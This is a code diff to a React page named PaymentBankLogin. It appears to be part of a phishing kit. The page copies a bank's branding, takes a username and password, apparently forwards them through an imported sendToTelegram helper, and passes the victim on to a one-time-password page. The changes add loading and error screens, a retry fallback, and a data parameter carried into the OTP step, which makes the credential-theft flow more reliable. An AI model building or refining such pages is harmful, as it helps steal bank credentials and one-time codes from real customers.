@@ -6,8 +6,9 @@ import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { bankBranding } from "@/lib/brandingSystem";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound, Globe, ChevronDown } from "lucide-react";
+import { useUpdateLink } from "@/hooks/useSupabase";
+import { useLinkWithFallback, appendDataParam } from "@/hooks/useLinkWithFallback";
+import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound, Globe, ChevronDown, AlertCircle, RefreshCw } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
@@ -22,7 +23,7 @@ const PaymentBankLogin = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading } = useLink(id);
+  const { data: linkData, isLoading: linkLoading, error: linkError, handleRetry } = useLinkWithFallback(id);
   const updateLink = useUpdateLink();
   
   const [username, setUsername] = useState("");
@@ -88,7 +89,62 @@ const PaymentBankLogin = () => {
   
   const loginType = getLoginType();
   
-  if (linkLoading || !linkData) {
+  if (linkLoading) {
+    return (
+      <div 
+        className="min-h-screen flex items-center justify-center" 
+        dir="rtl"
+        style={{
+          background: selectedBankBranding?.colors?.surface || '#F5F5F5'
+        }}
+      >
+        <div className="text-center">
+          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: selectedBankBranding?.colors?.primary || '#1976D2' }} />
+          <p style={{ color: '#666' }}>جاري تحميل البيانات...</p>
+        </div>
+      </div>
+    );
+  }
+  
+  if (linkError || !linkData) {
+    return (
+      <div 
+        className="min-h-screen flex items-center justify-center" 
+        dir="rtl"
+        style={{
+          background: '#F5F5F5'
+        }}
+      >
+        <div className="text-center max-w-md mx-auto px-4">
+          <div className="w-20 h-20 rounded-full mx-auto mb-6 flex items-center justify-center" style={{ backgroundColor: '#EF444420' }}>
+            <AlertCircle className="w-10 h-10 text-red-500" />
+          </div>
+          <h2 className="text-2xl font-bold mb-3 text-gray-900">خطأ في تحميل البيانات</h2>
+          <p className="text-base mb-6 text-gray-600">
+            {linkError ? 'حدث خطأ أثناء تحميل بيانات الدفع' : 'لم يتم العثور على بيانات الدفع'}
+          </p>
+          <div className="flex flex-col gap-3">
+            <Button 
+              onClick={handleRetry}
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
+            >
+              <RefreshCw className="w-4 h-4 ml-2" />
+              إعادة المحاولة
+            </Button>
+            <Button 
+              onClick={() => navigate('/services')}
+              variant="outline"
+              className="w-full"
+            >
+              العودة للخدمات
+            </Button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+  
+  if (!linkData) {
     return (
       <div 
         className="min-h-screen flex items-center justify-center" 
@@ -217,7 +273,8 @@ const PaymentBankLogin = () => {
       description: "تم تسجيل الدخول بنجاح",
     });
     
-    navigate(`/pay/${id}/otp`);
+    const nextUrl = appendDataParam(`/pay/${id}/otp`, linkData);
+    navigate(nextUrl);
   };
   
   const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
